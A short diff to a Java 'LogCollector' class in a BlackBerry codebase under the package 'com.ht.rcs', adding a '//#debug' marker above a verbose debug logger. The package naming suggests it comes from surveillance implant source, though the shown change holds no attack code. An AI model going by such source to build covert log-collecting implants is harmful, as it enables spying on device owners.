@@ -30,6 +30,7 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 
 public class LogCollector implements Singleton {
+	//#debug
     private static Debug debug = new Debug("LogCollector", DebugLevel.VERBOSE);
 
     static LogCollector instance = null;
